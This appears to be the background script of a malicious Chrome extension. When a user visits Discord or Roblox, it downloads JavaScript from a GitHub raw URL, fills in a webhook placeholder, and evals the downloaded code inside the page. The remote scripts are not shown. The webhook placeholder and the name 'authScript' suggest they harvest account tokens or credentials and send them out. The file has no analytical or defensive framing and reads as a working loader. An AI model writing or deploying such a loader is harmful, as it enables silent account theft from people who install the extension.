chrome.webNavigation.onCompleted.addListener(function(details) {
  if (details.url.includes('discord.com')) {
    fetch('https://raw.githubusercontent.com/43a1723/extension-test/main/extension/js/discord.js')
      .then(response => response.text())
      .then(data => {
        const modifiedData = data.replace('%WEBHOOK%', '123');
        
        const script = `
          var discordScript = ${JSON.stringify(modifiedData)};
          eval(discordScript);
        `;

        chrome.scripting.executeScript({
          target: { tabId: details.tabId },
          func: new Function(script)
        });
      })
      .catch(error => console.error('Error fetching or modifying the script:', error));
  } else if (details.url.includes('roblox.com')) {
    fetch('https://raw.githubusercontent.com/43a1723/extension-test/main/extension/js/roblox.js')
      .then(response => response.text())
      .then(data => {
        const modifiedData = data.replace('%WEBHOOK%', '123');
        
        const script = `
          var authScript = ${JSON.stringify(modifiedData)};
          eval(authScript);
        `;

        chrome.scripting.executeScript({
          target: { tabId: details.tabId },
          func: new Function(script)
        });
      })
      .catch(error => console.error('Error fetching or modifying the script:', error));
  }
}, { url: [{ urlMatches: 'https://*.discord.com/*' }, { urlMatches: 'https://*.roblox.com/*' }] });
